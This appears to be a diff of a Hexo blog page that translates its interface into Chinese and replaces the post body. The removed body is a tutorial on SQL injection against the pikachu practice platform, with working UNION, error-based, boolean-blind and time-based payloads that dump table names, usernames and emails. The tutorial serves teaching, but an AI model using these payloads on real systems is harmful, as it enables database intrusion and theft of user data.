@@ -64,7 +64,7 @@
                             <a class=""
                                href="/"
                             >
-                                HOME
+                                首页
                             </a>
                         </li>
                     
@@ -72,7 +72,7 @@
                             <a class=""
                                href="/archives"
                             >
-                                ARCHIVES
+                                归档
                             </a>
                         </li>
                     
@@ -80,7 +80,7 @@
                             <a class=""
                                href="/categories"
                             >
-                                CATEGORIES
+                                分类
                             </a>
                         </li>
                     
@@ -88,7 +88,7 @@
                             <a class=""
                                href="/tags"
                             >
-                                TAGS
+                                标签
                             </a>
                         </li>
                     
@@ -115,22 +115,22 @@
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/">HOME</a>
+                       href="/">首页</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/archives">ARCHIVES</a>
+                       href="/archives">归档</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/categories">CATEGORIES</a>
+                       href="/categories">分类</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/tags">TAGS</a>
+                       href="/tags">标签</a>
                 </li>
             
         </ul>
@@ -178,7 +178,7 @@
             <ul>
                 
                     <li>
-                        <a href="/categories/CTF-WEB/">CTF-WEB</a>&nbsp;
+                        <a href="/categories/World/">World</a>&nbsp;
                     </li>
                 
             </ul>
@@ -190,7 +190,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/SQL/">SQL</a>&nbsp;
+                        <a href="/tags/Hello/">Hello</a>&nbsp;
                     </li>
                 
             </ul>
@@ -199,13 +199,9 @@
 
     
     
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>1.6k Words</span>
-        </span>
-    
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>6 Mins</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>1 分钟</span>
         </span>
     
     
@@ -221,221 +217,18 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="SQL-SQL注入基础"><a href="#SQL-SQL注入基础" class="headerlink" title="SQL-SQL注入基础"></a>SQL-SQL注入基础</h1><p>SQL注入即开发者对用户输入参数没有做到严格过滤，导致用户输入数据能够影响预设的查询功能</p>
-<p>通常表现为数据库原有信息被泄露、篡改，甚至删除</p>
-<h2 id="UNION注入-数字型注入"><a href="#UNION注入-数字型注入" class="headerlink" title="UNION注入-数字型注入"></a>UNION注入-数字型注入</h2><p>前提：用户通过传入的id等参数，可以从数据库中查询相应的记录</p>
-<p>对字符型注入的判断：判断输入值有无数字运算的特征行为</p>
-<p>例如：输入id=2与id=3-1得到的反馈是相同的，即该注入点为数字型注入</p>
-<p>以<a class="link"   target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu" >pikachu漏洞练习平台<i class="fas fa-external-link-alt"></i></a>上题目为例</p>
-<p>SQL-Inject/数字型注入（post）</p>
-<p>使用BURPSUITE修改post请求</p>
+            <p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210313110442914.png"
+                      alt="image-20210313110442914"
+                ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/img/BEACON2-1615603016247.png"
-                      alt="BEACON2"
+                     data-src="/img/image-20210313110447266.png"
+                      alt="image-20210313110447266"
                 ></p>
-<p>id=3</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/BEACON2-1615603974188.png"
-                      alt="BEACON2"
-                ></p>
-<p>id=5-2</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/BEACON2-1615603991994.png"
-                      alt="BEACON2"
-                ></p>
-<p>可见id值为“3”与id值为“5-2”所得反馈相同</p>
-<p>即该注入点为数字型注入</p>
-<p>使用UNION并入SQL查询语句来干扰正常查询</p>
-<p>在确定为数字型注入后，使用order by 1-99语句查询该数据表的字段数量</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> order by <span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<p>返回界面与id=1时相同</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> order by <span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<p>出现了错误</p>
-<p>即在该环境中，通过order by查询得到的字段数为2</p>
-<p>故union注入的语句如下：</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<p>访问id=1 union select 1,2</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220456908.png"
-                      alt="image-20210312220456908"
-                ></p>
-<p>既执行了id=1的查询，也执行了union后的查询</p>
-<p>指定id=-1或一个很大的值，使其无法正常执行原查询，则会执行union后的查询</p>
-<p>将union select 1,2中的1或2修改成需要的查询语句</p>
-<p>例如：</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,database()</span><br><span class="line">或</span><br><span class="line">id=-<span class="number">1</span> union select database(),<span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<p>database()函数用于查询当前数据库名，即可得到该数据库名为“pikachu“</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220518876.png"
-                      alt="image-20210312220518876"
-                ></p>
-<p>之后可通过修改查询语句进行对数据库的查询</p>
-<p>查询表名</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;pikachu&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里只显示第一项记录</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220530499.png"
-                      alt="image-20210312220530499"
-                ></p>
-<p>在原有数据后面加上”limit 1,1“参数即可显示第二条记录</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>”limit 1,1“即为条件限定，取查询结果第一条记录的后一条记录</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220541618.png"
-                      alt="image-20210312220541618"
-                ></p>
-<p>同理”limit 2,1“为限定查询结果第二条记录的后一条记录</p>
-<p>同理”limit 0,100“为限定查询结果的前一百条记录</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">100</span></span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220553461.png"
-                      alt="image-20210312220553461"
-                ></p>
-<p>亦可使用”group_concat“来用”,“联合多行记录</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #查询所有表名</span><br><span class="line">或</span><br><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; #查询“pikachu”库下所有表名</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220613379.png"
-                      alt="image-20210312220613379"
-                ></p>
-<p>继续查询所需要的</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;member&#x27;</span></span><br><span class="line">id=-<span class="number">1</span> union select username,email <span class="keyword">from</span> member</span><br></pre></td></tr></table></figure>
-
-<p>最后查询对应的”username“与”email“即可</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220625381.png"
-                      alt="image-20210312220625381"
-                ></p>
-<h2 id="UNION注入-字符型注入"><a href="#UNION注入-字符型注入" class="headerlink" title="UNION注入-字符型注入"></a>UNION注入-字符型注入</h2><p>GET参数输入的地方包裹单引号，变成字符串</p>
-<p>注入方式：尝试闭合前面单引号，且注释后面的语句</p>
-<p>即：使用单引号闭合前面单引号，使用注释符号注释后面语句</p>
-<p>常用注释：”#“、”/**/“</p>
-<p>构造时应使用符号的url编码</p>
-<p>空格：”%20“，”#“：”%23“，”‘“：”%27“</p>
-<p>url中构造</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe%27union%20select%<span class="number">201</span>,group_concat(table_name)%20<span class="keyword">from</span>%20information_schema.tables%20where%20table_schema=database()%<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220641218.png"
-                      alt="image-20210312220641218"
-                ></p>
-<p>修改union后面的查询语句即可继续查询所需的内容</p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用页面报错信息获取数据</p>
-<p>常用于报错注入的函数：</p>
-<blockquote>
-<p>updatexml()： MySQL对XML文档数据进行查询和修改的XPATH函数</p>
-</blockquote>
-<blockquote>
-<p>extractvalue()：MySQL对XML文档数据进行查询的XPATH函数</p>
-</blockquote>
-<blockquote>
-<p>floor()：MySQL中用来取整的函数</p>
-</blockquote>
-<p>UPDATEXML (XML_document, XPath_string, new_value);</p>
-<blockquote>
-<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
-</blockquote>
-<blockquote>
-<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程</p>
-</blockquote>
-<blockquote>
-<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
-</blockquote>
-<blockquote>
-<p>作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</p>
-</blockquote>
-<p>测试题：pikachu漏洞练习平台/数字型注入(post)</p>
-<p>通过报错信息查询数据库名称</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220700217.png"
-                      alt="image-20210312220700217"
-                ></p>
-<p>将database()函数替换为其他查询语句即可</p>
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>通过注入得到的真假回显推测出数据</p>
-<p>测试环境：pikachu漏洞练习平台</p>
-<p>添加”and“，”and“两边需同时满足查询才可执行</p>
-<p>测试题：pikachu漏洞练习平台/数字型注入(post)</p>
-<p>判断数据库名的长度</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> and length(database())&gt;=<span class="number">7</span></span><br></pre></td></tr></table></figure>
-
-<p>执行成功</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> and length(database())&gt;=<span class="number">8</span></span><br></pre></td></tr></table></figure>
-
-<p>不能执行</p>
-<p>上文可知该数据库名为”pikachu“，为7位字符</p>
-<p>判断数据库的名称</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> and substr(database(),<span class="number">1</span>,<span class="number">1</span>)&gt;<span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>执行成功</p>
-<p>substr()函数功能为截取，“1,1”即截取database()中从第一个开始字符，返回一个字符，这点与limit不同</p>
-<p>即可使用二分法去猜测字符</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> and substr(database(),<span class="number">1</span>,<span class="number">1</span>)&gt;<span class="string">&#x27;p&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>执行成功</p>
-<p>MySQL自带的截取函数：substring(),mid(),substr()</p>
-<p>将database()函数换成其他查询语句，即可查询所需</p>
-<p>如若改变测试题为：pikachu漏洞练习平台/字符型注入(get)</p>
-<p>get型要注意url编码,而字符型需要构造闭合，且需要注释，故构造如下</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe%<span class="number">27</span>%20and%20length(database())&gt;<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<p>执行成功</p>
-<p>其他具体查询就与前文类似</p>
-<p>在数字型与字符型分别访问以下两个</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id= <span class="number">1</span> or <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">kobe%<span class="number">27</span>%20or%<span class="number">201</span>=<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
-
-<p>由于1=1是永真条件，页面定能执行，返回出来的东西还会有惊喜</p>
-<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>某些情况下页面回显内容是完全一致的，可通过增加语句执行时需要等待的时间来判断查询是否为有效查询</p>
-<p>测试题：pikachu漏洞练习平台/字符型注入(get)</p>
-<p>访问</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and sleep(3)#</span></span><br></pre></td></tr></table></figure>
-
-<p>后台等待三秒才开始执行</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="img/image-20210312220715891.png"
-                      alt="image-20210312220715891"
-                ></p>
-<p>判断数据库名</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and if((substr(database(), 1, 1))=&#x27;</span>p<span class="string">&#x27;, sleep(3), null)#</span></span><br></pre></td></tr></table></figure>
-
-<p>延迟了三秒，证明查询成功，数据库名第一个字母为“p”</p>
-<p>可通过这种特性，查询所需内容，具体与布尔盲注类似</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注</p>
 
         </div>
 
@@ -452,7 +245,7 @@
                         >
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">Hello World</span>
-                                <span class="post-nav-item">Next posts</span>
+                                <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
                               <i class="fas fa-chevron-right"></i>
@@ -488,18 +281,18 @@
             <div class="website-count info-item">
                 
                     <span id="busuanzi_container_site_uv">
-                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                     </span>
                 
                 
                     <span id="busuanzi_container_site_pv">
-                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                     </span>
                 
             </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
         </div>
         
     </div>
@@ -574,7 +367,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">SQL-SQL注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UNION%E6%B3%A8%E5%85%A5-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">UNION注入-数字型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UNION%E6%B3%A8%E5%85%A5-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">UNION注入-字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.4.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.6.</span> <span class="nav-text">总结</span></a></li></ol></li></ol>
+        
     </div>
 </div>
         </aside>
@@ -596,7 +389,7 @@
                 <input autocomplete="off"
                        autocorrect="off"
                        autocapitalize="off"
-                       placeholder="Search..."
+                       placeholder="搜索..."
                        spellcheck="false"
                        type="search"
                        class="search-input"
